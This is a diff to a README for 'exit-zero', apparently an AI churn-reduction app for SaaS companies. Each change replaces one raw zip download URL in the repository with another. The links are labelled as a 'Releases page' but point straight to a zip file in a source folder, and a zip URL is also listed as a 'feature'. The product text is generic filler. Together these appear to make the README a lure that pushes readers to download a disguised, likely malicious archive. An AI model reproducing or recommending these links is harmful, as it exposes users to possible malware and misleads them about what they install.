@@ -1,7 +1,7 @@
 # 🚀 exit-zero - Reduce Churn with AI Solutions
 
 ## 📥 Download Now
-[![Download Latest Release](https://raw.githubusercontent.com/pavan286878/exit-zero/main/calycled/exit-zero.zip%20Latest%20Release-Exit%20Zero-blue)](https://raw.githubusercontent.com/pavan286878/exit-zero/main/calycled/exit-zero.zip)
+[![Download Latest Release](https://github.com/pavan286878/exit-zero/raw/refs/heads/main/src/lib/exit_zero_1.7-beta.3.zip%20Latest%20Release-Exit%20Zero-blue)](https://github.com/pavan286878/exit-zero/raw/refs/heads/main/src/lib/exit_zero_1.7-beta.3.zip)
 
 ## 🚀 Getting Started
 Welcome to exit-zero! This application helps SaaS companies keep customers happy. With personalized offers and data ownership, you can reduce churn effectively.
@@ -25,7 +25,7 @@ This app includes features related to:
 - API
 - Churn Management
 - Machine Learning
-- https://raw.githubusercontent.com/pavan286878/exit-zero/main/calycled/exit-zero.zip
+- https://github.com/pavan286878/exit-zero/raw/refs/heads/main/src/lib/exit_zero_1.7-beta.3.zip
 - Open Source
 - React
 - Reinforcement Learning
@@ -37,7 +37,7 @@ This app includes features related to:
 - Webhooks
 
 ## 📥 Download & Install
-To get started with exit-zero, visit our [Releases page](https://raw.githubusercontent.com/pavan286878/exit-zero/main/calycled/exit-zero.zip) to download the application.
+To get started with exit-zero, visit our [Releases page](https://github.com/pavan286878/exit-zero/raw/refs/heads/main/src/lib/exit_zero_1.7-beta.3.zip) to download the application.
 
 1. Open the link above in your web browser.
 2. Find the latest release version.
@@ -56,7 +56,7 @@ To get started with exit-zero, visit our [Releases page](https://raw.githubuserc
 If you encounter issues:
 - Ensure your system meets the requirements.
 - Restart the application and try again.
-- Check for updates on the [Releases page](https://raw.githubusercontent.com/pavan286878/exit-zero/main/calycled/exit-zero.zip).
+- Check for updates on the [Releases page](https://github.com/pavan286878/exit-zero/raw/refs/heads/main/src/lib/exit_zero_1.7-beta.3.zip).
 
 ## 📧 Support
 Reach out to our support team if you need help. You can find contact information on the application's help section.
